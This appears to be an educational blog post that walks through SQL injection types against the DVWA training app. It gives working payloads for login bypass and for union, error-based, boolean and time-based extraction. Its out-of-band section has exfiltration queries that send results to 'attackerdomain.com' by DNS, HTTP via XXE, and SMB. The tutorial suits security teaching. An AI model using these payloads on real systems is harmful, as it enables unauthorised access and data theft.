---
title:  "SQL Injection"
imgdir: sqli
date: 2021-11-06
category: owasp10
tags: web sql
excerpt: An overview of SQL injection concepts and techniques.
---

Segments of this article were written with [Damn Vulnerable Web Application (DVWA)](https://dvwa.co.uk/) as the target
{: .notice--info}

SQL Injection is a common vulnerability often found in Web Applications due to improperly sanitised user input leading to manipulation of the queries being passed to a SQL database. Exploitation can lead to a range of results from data disclosure to authentication bypass to remote code execution.

A range of SQL/SQLi cheatsheets are available [here](/cheatsheets/db/).

# Types of SQL Injection

There are three main categories of SQL injection *In-band, Inferential and Out-of-band* which can then be broken down into futher subcategories. Which method/s can be leveraged is dependant on various factors including what data is returned, how verbose error messages are, and which features are enabled/disabled on the host.

- **In-band**:
In-band SQL injection is the easiest to exploit, it refers to injections where the attack and data exfiltration are performed over the same channel. It's broken down into two main categories:
  - Union based: Union based SQL injection is possible when database results are presented to the user based their input such as in a search form, and can be abused by using the `UNION` operator to append additional query results to the standard query results.
  - Error based: Error based SQL injection is achieved when verbose error messages are presented to the user based on their input. By controlling where the error is thrown, this can be abused to return results for additional queries within the error messages.

- **Inferential (Blind)**:
Inferential SQL injections are possible when the the response changes, or can be manipulated with a time delay, based on the results of a boolean query. This can then be used to perform a [binary search](https://en.wikipedia.org/wiki/Binary_search_algorithm) to determine each character in a query results. It's broken down into two main categories:
  - Boolean based: Boolean based SQL injection is possible when the output presented to the user is different based on whether an injected query returns a `true` or `false` value. By using this difference, one can iterate through possible string values in these `true` or `false` queries to eventually query data from the database. This is a pretty slow, inefficient method but can of course be automated.
  - Time based: Time based SQL injection operates in a similar manner to Boolean based injection - however, instead of the output presented to the user changing, a time delay is applied based on the results of a boolean query. This time delay can then be measured to infer the results and ultimately enumerate data from the database.

- **Out-of-band**:
Out of band SQL injection is a method in which the injection triggers data exfiltration through another channel such as a DNS query or HTTP request.

# Finding Injection Point
To exploit a SQL Injection vulnerability, we need to identify an data entry field such as a login page, search field or even via a cookie. Once we've identified a potential target, we can try entering various character cominations to try and trigger an error or change in behaviour. Such as:
```
'
')
'))
"
")
"))
`
`)
`))
#
--
/*
```
{% include post-image name="SQLi_Entry_1.png" %}{:style="width:50%"}
{% include post-image name="SQLi_Entry_2.png" %}

Based on the error above, there appears to be a syntax error due to `'''`, this implies that our input of `'` is not being sanitised and so triggering and error with the server expecting a closing quote. Some of the methods outlined below will require further fuzzing with common injections due to lack of change in observable behaviour from the host.

# In-band

## Exploitation

### Authentication Bypass
SQL injection can often be used to bypass authentication pages. First we need to consider how a standard authentication may occur as represented the following segment of PHP code
```php
$username=$_POST['username'];
$password=$_POST['password'];
$query="SELECT user_id FROM users WHERE username='$username' AND password='$password';
```
As this query is stored with no input sanitisation, we can provide certain payloads to bypass this authentication. For example, if we were to send the POST request with the username variable as `user` and the password as `' OR '1'='1`, that would result in the following query being generated by the PHP webserver.
```sql
SELECT user_id FROM users WHERE username='user' AND password='' OR '1'='1';
```
In this example the username is mostly irrelevant due to the operator precendence ([MSSQL](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/operator-precedence-transact-sql)/[MySQL](https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html)) meaning that the `AND` operator takes precendence over `OR`. This is illustrated below with brackets added to match the order of operations.
```sql
SELECT user_id FROM users WHERE (username='user' AND password='') OR '1'='1';
```
This query will return all user ids as `'1'='1'` is always true, and so may log you in as a user. Alteratively, if we sent the POST request with the username as `admin'--` and leave the password blank, that would result in the following query being generated.
```sql
SELECT user_id FROM users WHERE username='admin'-- AND password='' OR '1'='1';
```
Here we're using `--` to comment out the remainder of the query, therefore returning the user_id for admin without the need for a password. The above query is the equivilent of
```sql
SELECT user_id FROM users WHERE username='admin';
```
This should result in a successful login as the user named admin.
Dependant on the query being made of the server side, you may need to use a combination of characters such as `--#'"()` to implement the bypass successfully. There are good wordlists available at [hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass)

### Union based
Returning to the DVWA example, we were able to identify a possible SQL injection point. Reviewing the standard functionality of the input box, we can see that entering a number returns details of the user with that User ID.

{% include post-image name="SQLi_Union_1.png" %}{:style="width:50%"}

Following on from the logic of the authentication bypass. If we enter a search query of `' OR '1'='1`, then all records will be returned.

{% include post-image name="SQLi_Union_2.png" %}{:style="width:50%"}

Reviewing the source code of this segment, we can take a closer look at what we've done here.
```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

By setting our payload in the id variable, the resultant query becomes:
```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';";
```
And of course 1 always equals 1 and so this returns true for all records.

The next step for our Union based injection is to get a better understanding of what data is being returned to us, so that we can identify how we'll abuse it. We start this by enumerating the number of columns in the queried table by using the `ORDER BY` operator ([MySQL](https://dev.mysql.com/doc/refman/8.0/en/sorting-rows.html)/[MSSQL](https://docs.microsoft.com/en-us/sql/t-sql/queries/select-order-by-clause-transact-sql)). The goal here is to sort the records by a specific column and then increment column index until we trigger an error, thus determining the column count of the table. This process can be automated with various tools including [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/using).

Here we'll use the comment characters of `-- ` to comment out the remainder of the query (note the space after the dashes for MySQL targets). Starting the process by ordering by column number 1 with an entry of `1' OR '1'='1' ORDER BY 1 -- ` we can see that the order of the records has changed, it appears to be sorting by the first name now, implying that column 1 is the first name column. The full SQL query run on the server would be:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1' ORDER BY 1 -- ';
```

{% include post-image name="SQLi_Union_3.png" %}{:style="width:50%"}

Repeating this process and incrementing up to column 2 with a query of `1' OR '1'='1' ORDER BY 2 -- `, we can see that the records are now sorted by their surname.

{% include post-image name="SQLi_Union_4.png" %}{:style="width:50%"}

Incrementing up to column 3 with a query of `1' OR '1'='1' ORDER BY 3 -- ` we get an error message stating that column 3 is unknown.

{% include post-image name="SQLi_Union_5.png" %}{:style="width:40%"}

This has determined that the queried table has 2 columns. We're seeing the values from both columns - however, it's important to recognise that this wont always be the case, there will more likely be circumstances where only values from specific columns are returned back to the user and so another method can be used to easily determine which columns are being returned. 

This method is where the `UNION` operator comes into action ([MS](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql)/[MySQL](https://dev.mysql.com/doc/refman/8.0/en/union.html)). We can use this to append our own data to the returned records to get a clear understanding of which columns they're from. We can do this by using:

```sql
1' UNION ALL SELECT '1','2
```

(incrementing the numbers from 1 to column count).

There's a couple of key things to point out about this query. You'll note that the 1 and 2 are wrapped in quotes, this is as we know that column contains string type data - in other circumstances, you may have to play with combinations of strings and integers to find a match. Additionally we've removed the `OR '1'='1'` as we only really need the one record returned. We've dropped the `-- ` at the end as well as the `'` as we know there is a quote appended to the end of the query normally.

This should result in the target running a SQL query of:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION ALL SELECT '1','2';
```

Running this query, we can see that the admin record has been returned due to the ID match of 1. Additionally we can see another record appended to the end with a First name of 1 and a surname of 2. This is as the `UNION` operator has successfully appended our additional record.

{% include post-image name="SQLi_Union_6.png" %}{:style="width:50%"}

To illustrate this more clearly, we can update our query to
```sql
1' UNION ALL SELECT 'Column_1','Column_2
```

{% include post-image name="SQLi_Union_7.png" %}{:style="width:50%"}

If we review the PHP code again, the full SQL query run on the server would be:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION ALL SELECT 'Column_1','Column_2';
```

Up till now, we've just used `UNION` to append our own values, but we can use it to return values from arbitrary SQL queries. For example, we can sent update our query to 

```sql
1' UNION ALL SELECT @@version,'Column_2
```

to determine the version of the host.

The full SQL query run on the server would be:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION ALL SELECT @@version,'Column_2';
```

{% include post-image name="SQLi_Union_8.png" %}{:style="width:50%"}

Here we've successfully used a Union based SQL injection attack to execute arbitrary SQL queries on a target and retrieve the results. Check out the cheatsheets [here](/cheatsheets/db/) for commands that can be used for further enumeration/exploitation of the target.

### Error based

Using the same User ID search field as the previous example, our initial investigations found a rather verbose error message when we entered `'`.
{% include post-image name="SQLi_Entry_2.png" %}

By controlling what triggers the error message, we can exfiltrate data through the error messages. There are a few methods of achieving this, in MSSQL we can use `CONVERT` or `CAST` ([MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql)) to try and convert query result strings to integers to trigger the error. MySQL is slightly more complex, we can leverage the `ExtractValue()` ([MySQL](https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html))function which is normally used to retrieve data from an XML object. For example:
```sql
ExtractValue(rand(),concat(0x3a,version()))
```
Breaking this down, we can see the concat function being used: `concat(0x3a,version())`. This prepends a `:` to the results of our `version()` query (`0x3a` is the hex representation of `:`), this ensures that the `ExtractValue()` function will never be successful and will always throw an error. Now that's clarified, we can see that the `ExtractValue()` function is being passed two parameters 1) a random number generated by `rand()` as the XML fragment and 2) the results of `version()` with `:` prepended as the XPath expression.

We then need to join this new payload with the characters previously discovered as needed to escape the current query.
```sql
1' AND ExtractValue(rand(),concat(0x3a,version()));-- 
```
The full SQL query run on the server would be:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND ExtractValue(rand(),concat(0x3a,version()));--';
```


Entering this into the UserID field gives us the expected error message with the output of `version()` included. We can also see the `:` appended and the invalid XPath as expected.

{% include post-image name="SQLi_Error_1.png" %}{:style="width:40%"}

Here we've successfully used an Error based SQL injection attack to execute arbitrary SQL queries on a target and retrieve the results. Check out the cheatsheets [here](/cheatsheets/db/) for commands that can be used for further enumeration/exploitation of the target.

# Inferential (blind)
Inputs vulnerable to inferential SQL injection are typically harder to identity than their in-band counterparts. Detection typically involves fuzzing with common boolean comparision and time delays.

## Exploitation

### Boolean based

With Boolean based SQLi, we again will exploit a input field on a site, but instead of query results being returned, the reponse to the user changes based on whether the SQL query returns `true` or `false`. Consider the following example from DVWA:

Invalid User ID:
{% include post-image name="SQLi_Boolean_1.png" %}{:style="width:40%"}

Valid User ID:
{% include post-image name="SQLi_Boolean_2.png" %}{:style="width:40%"}

In this example, we can see that the message in red changes dependant on whether the results on the query are `true` or `false`. Reviewing the relevant excerpts of the PHP code, we can get a clear idea of what's going on (code simplified).

```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query );
if (mysqli_num_rows( $result ) > 0) {
echo '<pre>User ID exists in the database.</pre>';
}
else {
echo '<pre>User ID is MISSING from the database</pre>';
}
```

If the query returns more than 0 rows, then the message will be `User ID exists in the database.`. Coupling this up with the techniques covered in in-band SQLi, we can add an additional boolean comparison here to affect the page output. Starting with the query `1' AND '1'='1` resulting in the server running:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND '1'='1';
```

Running this query shows the message expected from a `true` response to the query.
{% include post-image name="SQLi_Boolean_3.png" %}{:style="width:40%"}

Modifying our injected query segment to come back false with `1' AND '1'='0`, we can confirm that we are able to control this output as expected.
{% include post-image name="SQLi_Boolean_4.png" %}{:style="width:40%"}

Now from here need to use boolean queries to eventually retrieve our results. This would be too time consuming to do manually so would need automation, but the general process has been outlined below. This can be achieved by using a [binary search](https://en.wikipedia.org/wiki/Binary_search_algorithm) against the alphabet for each character. For example, if we are going to retrieve the `CURRENT_USER();` results, we could use a query such as:
```sql
1' AND SUBSTRING((SELECT CURRENT_USER()), 1, 1) > 'm
```
Breaking this query down, we're using `SUBSTRING()` to extract the first character of the results of `CURRENT_USER()` and then checking whether that character is 'greater than' (later in alphabet than) the letter 'm' (middle character in the alphabet). Reviewing the PHP source code, we can see that the query to the SQL server then becomes.
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND SUBSTRING((SELECT CURRENT_USER()), 1, 1) > 'm';
```
In this case, the first character returned from `CURRENT_USER()` is before 'm' in the alphabet and so we get the message expected on a `false` query.
{% include post-image name="SQLi_Boolean_5.png" %}{:style="width:40%"}
We now know that the first character of the results of `CURRENT_USER()` is in the first half of the alphabet and so can rereun the query with 'f' as the final character to determine if it's in the first or second quarter. Running through this binary search process will eventually allow data exfiltration from the database.

Here we've successfully used a Blind Boolean based SQL injection attack to begin to execute arbitrary SQL queries on a target and retrieve the results. Check out the cheatsheets [here](/cheatsheets/db/) for commands that can be used for further enumeration/exploitation of the target.

### Time based

Time based SQLi is similar to Boolean based in the binary approach to data exfiltration. However, instead of the boolean query affecting the response to the user, we can use conditional time delays to infer the characters returned by certain queries. Here we'll reuse part of the PHP excerpt from the Boolean SQLi:

```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query );
```

Using the concepts covered in Union based SQLi, we can then inject a conditional time delay to determine the output of a boolean query, such as the following:
```sql
1' UNION ALL SELECT 1,IF(('1'='1'), sleep(10), NULL ); -- 
```
Sending this as our query results in a sleep of 10 seconds as '1' always equals '1'.

{% include post-image name="SQLi_Time_1.png" %}{:style="width:40%"}
{% include post-image name="SQLi_Time_2.png" %}{:style="width:40%"}

Reviewing the query that the server will be executing clarifies the process. 
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION ALL SELECT 1,IF(('1'='1'), sleep(10), NULL ); --';
```

Rerunning this with an non true comparision doesn't result in a time delay
```sql
1' UNION ALL SELECT 1,IF(('1'='0'), sleep(10), NULL ); -- 
```

Based on this, we can now run boolean queries and infer the results based on whether there is a time delay. We can then use the binary search methodology covered in the Boolean Based SQLi to build the following:
```sql
1' UNION ALL SELECT 1,IF((SUBSTRING((SELECT CURRENT_USER()), 1, 1) > 'm'), sleep(10), NULL ); -- 
```

Breaking this query down, we can see that `SUBSTRING()` extracts the first character returned from `CURRENT_USER()` which is then compared with 'm' by the `IF()` function to determine if it is later in the alphabet. If this `IF()` query returns true, then the SQL server will sleep for 10 seconds. As with the Boolean SQLi, we then need to iterate through this process, narrowing down the results to identify each character individually.

One key consideration to bear in mind when exploiting through this method, you need to be careful to ensure that you can accurately and consistently measure the time delay. Overloading the server with loads of queries could cause unintended or inaccurately measured delays which can distort results. Additionally you need to find a good balance in time delay between it taking forever, and it being too insignificant a delay to reliably measure. Nonetheless, we have successfully used a Time Based SQL injection to execute arbitrary SQL commands and begin to retrieve their results.

# Out of band

With the above methods, we're either dependant on being able to affect the output with our injected query, or we require the SQL queries to run synchronously so that we can add time delays. In some circumstances, this may not be possible and we may need to rely on other channels to exfiltrate data.

The most common exfiltration methods for out-of-band SQLi are via HTTP/DNS requests or via file share access, both of which require certain features to be enabled on the target.

Finding targets vulnerable to Out-of-band SQLi are often difficult to find and typically require fuzzing the host with common payloads.

## Exploitation

### DNS Exfiltration

With DNS exiltration, we're injecting a SQL query which triggers a DNS request from the target. We then either need to be in a position where we can poision the DNS queries of the server - or we can trigger the DNS lookup for a domain that we control. If the latter, we would need to set the nameserver for that domain to a host on which we can monitor DNS lookups. To validate this, we first want to trigger a DNS lookup for a named domain.  In MySQL we can use the `LOAD_FILE` function ([MySQL](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file)) such as:

```sql
SELECT LOAD_FILE('\\\\attackerdomain.com\\x.txt');
```

This query can then be modified to concatenate the output of another query into the DNS lookup, for example:

```sql
SELECT LOAD_FILE(CONCAT('\\\\',CURRENT_USER(),'.attackerdomain.com\\x.txt'));
```

This will allow us to execute arbitrary SQL commands and gather the output through DNS queries.

### HTTP Exfiltration

With Oracle database targets, we may be able to exploit an XML external entity (XEE) vulnerability to trigger an HTTP request by using the `EXTRACT_VALUE` function ([Oracle](https://docs.oracle.com/cd/B19306_01/server.102/b14200/functions052.htm)), such as the following:

```sql
SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attackerdomain.com/test"> %remote;]>'),'/1') FROM dual;
```

At this point, we can either exfiltrate the data via a subdomain and follow a similar process to the DNS exfiltration, or we can exfiltrate it via the HTTP GET request. eg:

```sql
SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attackerdomain.com/'|| SELECT user FROM dual ||'"> %remote;]>'),'/1') FROM dual;
```

This will allow us to execute arbitrary SQL commands and gather the output through HTTP Requests.


### File Share Exfiltration

In some circumstances, we may be able to exfiltrate data to an SMB network share. In MySQL you can leverage `SELECT ... INTO OUTFILE`{:.language-sql .highlight} or `SELECT ... INTO DUMPFILE`{:.language-sql .highlight} ([MySQL](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)). For example:

```sql
SELECT CURRENT_USER() INTO DUMPFILE '\\\\192.168.x.x.\\sql\\current_user.txt';
```

This will allow us to execute arbitrary SQL commands and save the output to a network share that we control.
